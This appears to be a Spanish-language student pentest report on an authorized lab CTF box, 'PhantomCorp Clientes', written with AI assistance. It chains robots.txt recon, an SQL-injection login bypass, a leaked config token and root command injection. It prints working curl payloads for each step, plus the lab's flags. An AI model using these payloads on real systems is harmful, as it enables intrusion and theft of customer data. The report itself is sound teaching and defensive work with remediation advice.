# Informe de Penetration Test — PhantomCorp "Clientes"

**Cliente:** PhantomCorp S.A.  ·  **Auditor (grupo):** 14
**Integrantes:** Martín Cesano — `@MartinCesano` · *(completar resto del grupo: nombre — usuario GitHub)*
**Fecha:** 2026-11-20  ·  **Tipo:** Caja negra  ·  **Alcance:** host `phantomcorp` (lab)

## 0. Declaración de uso de IA

Se utilizó **Claude Code (modelo Opus)** como asistente del engagement, operando
exclusivamente dentro de la consola del atacante del lab (`cyberlab-attacker`)
contra el target autorizado `phantomcorp`. La IA ayudó a orquestar los comandos,
a estructurar la evidencia en `/loot` y a redactar este informe.

**Validación de la salida:** cada hallazgo se ejecutó contra el target real y su
salida quedó registrada en `evidencia/` (archivos `01-…` a `12-…`). Las cuatro
flags se verificaron de forma independiente con `./ctf submit`, que compara el
SHA-256 de la flag contra `retos.manifest` — ninguna flag ni hallazgo se tomó de
material del docente. Todo lo que se afirma acá es reproducible con los comandos
del apartado 4 y el anexo.

---

## 1. Resumen ejecutivo

- **Qué se hizo:** una auditoría de caja negra (sin credenciales ni documentación)
  del sistema **"Clientes"** de PhantomCorp, limitada al host del lab.
- **Resultado global:** **el sistema fue comprometido por completo.** Partiendo de
  cero, se logró entrar al panel interno, robar credenciales y ejecutar comandos
  en el servidor **como administrador (root)**, llegando hasta la base de datos de
  clientes.
- **Riesgo de negocio:** quedó expuesta la base de **48.210 clientes con nombre,
  DNI y número de tarjeta**. Una fuga de este tipo implica incumplimiento de la
  Ley 25.326 (Protección de Datos Personales), daño reputacional y potencial
  fraude con tarjetas. Un atacante externo podría haber hecho lo mismo sin dejar
  credenciales ni pistas evidentes.
- **Recomendación prioritaria:** tratar los cuatro hallazgos como incidentes
  abiertos. El de mayor urgencia es **eliminar la ejecución de comandos del
  endpoint `/api/reporte`** y **parametrizar el login**: con cualquiera de esos
  dos cortado, la cadena de ataque completa se rompe.

| Severidad | Cantidad de hallazgos |
|---|---|
| Crítica | 2 |
| Alta | 1 |
| Media | 1 |
| Baja | 0 |

---

## 2. Alcance y metodología

**En alcance:** únicamente el host `phantomcorp` (servicio HTTP en el puerto 80),
dentro de la red `labnet` del laboratorio.

**Fuera de alcance:** cualquier otro host, la infraestructura del lab, acciones
destructivas (borrado de datos, DoS) y todo lo externo al laboratorio
(Ley 26.388). No se ejecutó ninguna acción destructiva: el acceso con permisos de
root se usó sólo para **leer** el archivo de datos y demostrar impacto.

**Marco seguido** — metodología estándar de pentest, encadenando las unidades
05–10 del curso:

```
recon/enum  ->  explotación (foothold)  ->  post-explotación (loot)  ->  impacto
  (U05–06)          (U07)                      (U08)                     (U09–10)
```

Herramientas: `nmap`, `curl` (consola del atacante del lab). Toda la evidencia se
guardó en `/loot` (montado en el repo) y se adjunta en `evidencia/`.

---

## 3. Narrativa del ataque

Sin credenciales ni documentación, se arrancó por **reconocimiento**. Un escaneo
de `nmap` confirmó un único servicio: un servidor HTTP propio, `PhantomClientes/2.0`,
en el puerto 80. La raíz del sitio sólo mostraba un "portal público" vacío, así que
se buscó superficie oculta: **`/robots.txt` delataba una ruta `Disallow: /portal-rrhh`**
que no estaba enlazada desde ningún lado. Al pedir `/portal-rrhh` apareció el
**portal interno de RRHH** con un formulario de login — y, en un comentario del
HTML, la primera flag. *(Hito R1)*

Con el portal localizado pero sin credenciales, se probó el login. Las
credenciales falsas devolvían `401`. Al inyectar una comilla en el usuario
(`admin'`) el servidor respondió con un **error de SQL** (`unrecognized token`),
confirmando una **inyección SQL** en la consulta de autenticación. Se abusó de
ella con la carga clásica de bypass **`user=admin' -- `**, que comenta el chequeo
de contraseña y devuelve al usuario `admin`: el servidor dio la bienvenida al
dashboard. **Foothold conseguido sin contraseña válida.** *(Hito R2)*

El dashboard ya autenticado revelaba una pista de post-explotación: *"Backup de
config disponible en: `/backup/rrhh.conf`"*. Ese archivo se servía por HTTP **sin
ningún control de acceso** y contenía credenciales de base de datos y, sobre todo,
un **token de API** (`API_TOKEN=phantom-api-7c1e`). *(Hito R3)*

El propio backup indicaba cómo usar el token: `/api/reporte?token=...&cmd=...`.
Sin token, el endpoint devolvía `403`. Con el token looteado, el parámetro `cmd`
se ejecutaba tal cual en el servidor: `id` confirmó **ejecución de comandos como
`root` (uid=0)**. Desde ahí se listó `/app/priv` y se leyó
`clientes.db.txt`, exponiendo la **base de 48.210 clientes (nombre, DNI,
tarjeta)** — los *crown jewels*. *(Hito R4)*

```
robots.txt → /portal-rrhh   →   SQLi 'admin'-- '   →   /backup/rrhh.conf   →   RCE root → datos de clientes
   (R1 recon)                     (R2 foothold)          (R3 loot token)        (R4 impacto)
```

---

## 4. Hallazgos (detalle técnico)

> Ordenados por severidad, críticos primero.

### H-01 · Ejecución remota de comandos (command injection) en `/api/reporte`
- **Severidad:** Crítica · **CVSS 3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
  *(explotable por red, sin interacción; el token que lo "protege" se obtiene sin
  autenticación — ver H-03 —, por lo que PR:N; da control total del contenedor).*
- **Ubicación:** `GET /api/reporte`, parámetro `cmd` (gateado por `token`).
- **Descripción:** el valor de `cmd` se pasa directamente al shell del sistema
  (`os.popen(cmd)`). Cualquiera que posea el token puede ejecutar comandos
  arbitrarios. El proceso corre como **root**, de modo que el impacto es total.
- **Evidencia (reproducible):**
  ```bash
  # sin token: denegado
  $ curl -s "http://phantomcorp/api/reporte?cmd=id"
  token invalido; conseguilo del backup de RRHH
  # con el token looteado (H-03): RCE como root
  $ curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
  $ id
  uid=0(root) gid=0(root) groups=0(root)
  # lectura de los datos de clientes (crown jewels)
  $ curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat%20/app/priv/clientes.db.txt"
  clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
  ```
- **Impacto:** control total del servidor como root: lectura/exfiltración de la
  base de clientes (48.210 registros con DNI y tarjeta), movimiento lateral y
  persistencia. Es el hallazgo que concreta el daño al negocio.
- **Remediación:** **no pasar entrada del usuario al shell.** Eliminar `os.popen`
  y, si se necesita un "reporte", implementarlo con llamadas de código a funciones
  fijas (sin shell), o `subprocess.run([...], shell=False)` con una **lista blanca**
  de operaciones permitidas. Un token **no es un control suficiente**: aun con
  autenticación fuerte, ejecutar `cmd` arbitrario sería inaceptable. Ejecutar el
  servicio con un usuario sin privilegios (no root).

### H-02 · Inyección SQL con bypass de autenticación en el login del portal
- **Severidad:** Crítica · **CVSS 3.1:** 9.1 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
  *(sin autenticación previa; permite suplantar al administrador y manipular la
  consulta a la base).*
- **Ubicación:** `POST /portal-rrhh/login`, parámetros `user` / `pass`.
- **Descripción:** la consulta de login se arma por concatenación de strings:
  `SELECT user, rol FROM users WHERE user='<user>' AND pass='<pass>'`. La entrada
  no se sanea ni parametriza, lo que permite alterar la lógica de la consulta.
- **Evidencia (reproducible):**
  ```bash
  # credenciales falsas -> 401
  $ curl -s -i -X POST http://phantomcorp/portal-rrhh/login --data "user=admin&pass=x" | head -1
  HTTP/1.0 401 Unauthorized
  # una comilla confirma la SQLi (fuga de error)
  $ curl -s -X POST http://phantomcorp/portal-rrhh/login --data-urlencode "user=admin'" --data "pass=x"
  Error SQL: unrecognized token: "x'"
  # bypass: comenta el chequeo de pass -> sesión admin
  $ curl -s -X POST http://phantomcorp/portal-rrhh/login --data-urlencode "user=admin' -- " --data "pass=x"
  Bienvenido admin. Dashboard RRHH.
  FLAG{final_sqli_foothold}
  Backup de config disponible en: /backup/rrhh.conf
  ```
- **Impacto:** acceso al panel interno de RRHH como administrador sin conocer la
  contraseña. Es el **foothold** que habilita el resto de la cadena (descubrir el
  backup → token → RCE). Además, la SQLi permitiría volcar la tabla `users`.
- **Remediación:** **consultas parametrizadas / prepared statements**
  (`cursor.execute("… WHERE user=? AND pass=?", (user, pw))`). Nunca concatenar
  entrada en SQL. Complementar con hashing de contraseñas (bcrypt/argon2) y
  mensajes de error genéricos (no filtrar el error de SQL al cliente).

### H-03 · Backup de configuración accesible por HTTP con secretos en claro
- **Severidad:** Alta · **CVSS 3.1:** 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
  *(divulgación de información sensible, sin autenticación).*
- **Ubicación:** `GET /backup/rrhh.conf` (servido sin ningún control de acceso).
- **Descripción:** un archivo de configuración de respaldo queda accesible por la
  web y expone credenciales de base de datos y el token de API en texto plano.
- **Evidencia (reproducible):**
  ```bash
  $ curl -s http://phantomcorp/backup/rrhh.conf
  DB_USER=rrhh_app
  DB_PASS=Rh-2026
  API_TOKEN=phantom-api-7c1e
  # usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}
  ```
- **Impacto:** entrega al atacante las credenciales de la base y el **token que
  habilita el RCE de H-01**. Es el eslabón de post-explotación que convierte el
  acceso al portal en compromiso total. El endpoint ni siquiera exige el foothold:
  se sirve a cualquier cliente no autenticado.
- **Remediación:** **sacar los backups del directorio servido por web** y nunca
  exponer archivos de configuración por HTTP. **Rotar de inmediato** el token y las
  credenciales filtradas. Gestionar secretos fuera del código/web (variables de
  entorno, gestor de secretos) y versionarlos nunca en texto plano.

### H-04 · Exposición de portal interno y fuga de rutas vía `robots.txt`
- **Severidad:** Media · **CVSS 3.1:** 5.3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
  *(divulgación de superficie de ataque oculta).*
- **Ubicación:** `GET /robots.txt` → `Disallow: /portal-rrhh`; portal interno
  `GET /portal-rrhh` alcanzable desde la red sin segmentación.
- **Descripción:** `robots.txt` publica la ruta del portal interno de RRHH, que no
  está enlazado pero es accesible. `robots.txt` no es un control de acceso: lo que
  se "oculta" ahí queda señalizado para cualquiera.
- **Evidencia (reproducible):**
  ```bash
  $ curl -s http://phantomcorp/robots.txt
  User-agent: *
  Disallow: /portal-rrhh
  $ curl -s http://phantomcorp/portal-rrhh
  …<h1>Portal interno RRHH</h1><form method=post action=/portal/login>…
  <!-- recon: portal interno localizado. FLAG{final_recon_portal} -->
  ```
- **Impacto:** reduce a segundos el reconocimiento: le entrega al atacante la
  ubicación del punto de entrada (el login vulnerable de H-02).
- **Remediación:** **no listar rutas sensibles en `robots.txt`.** Segmentar el
  portal interno para que no sea accesible desde redes no confiables (VPN / red de
  administración / autenticación a nivel de red). Quitar comentarios con
  información útil del HTML entregado al cliente.

---

## 5. Conclusión

La postura de seguridad del sistema "Clientes" es **crítica**: una sola caja
concentra cuatro fallas que, encadenadas, llevan de un atacante anónimo a la
exfiltración total de datos personales con privilegios de root. Ninguno de los
hitos requirió credenciales legítimas.

La cadena **era perfectamente evitable** y, además, **redundantemente frágil**: no
hay un único eslabón débil sino varios controles ausentes. El corte más temprano y
barato es **parametrizar el login (H-02)**: sin foothold no se descubre el backup y
la cadena "esperada" se detiene. Pero conviene subrayar que, por H-03, el backup se
sirve sin autenticación, de modo que **el RCE de H-01 es alcanzable incluso sin la
SQLi** — por eso la remediación no puede ser puntual. La corrección de fondo es
tratar **toda entrada como hostil** (parametrizar consultas, no invocar el shell) y
**no exponer secretos ni superficie interna** (sacar backups de la web, rotar el
token, segmentar el portal, correr el servicio sin privilegios). Resueltos H-01 y
H-02, el impacto cae de "compromiso total" a, a lo sumo, divulgación de rutas.

---

## 6. Anexo

**Resultado de los hitos** (`evidencia/00-ctf-status-final.txt`):

```
   ✓  R1     Recon/enum: portal interno localizado
   ✓  R2     Explotacion: foothold por SQLi
   ✓  R3     Post: token de API looteado
   ✓  R4     Impacto: crown jewels (datos de clientes)
   ██████████████████████████████  4/4 (100%)
```

| Hito | Flag |
|---|---|
| R1 | `FLAG{final_recon_portal}` |
| R2 | `FLAG{final_sqli_foothold}` |
| R3 | `FLAG{final_token_looted}` |
| R4 | `FLAG{final_crown_jewels}` |

**Bitácora de evidencia** (carpeta `evidencia/`):

| Archivo | Contenido |
|---|---|
| `00-ctf-status-final.txt` | Captura de `./ctf status final` (4/4) |
| `01-nmap.txt` | Escaneo de servicios (`nmap -sV -p80`) |
| `02-raiz.html` / `03-robots.txt` / `04-portal.html` | Recon: superficie pública, fuga de rutas y portal interno (R1) |
| `05-login-fallido.txt` / `06-sqli-probe.txt` / `07-sqli-bypass.txt` | SQLi: baseline, confirmación y bypass (R2) |
| `08-backup-conf.txt` | Backup con credenciales y token (R3) |
| `09-sin-token.txt` / `10-rce-id.txt` / `11-rce-ls.txt` / `12-crown-jewels.txt` | RCE gateado por token: denegación, `id` root, listado y dump de clientes (R4) |

Target: `PhantomClientes/2.0` (HTTP/80). Engagement ejecutado el 2026-11-20 desde
la consola del atacante del lab contra `phantomcorp`. Sin acciones destructivas.
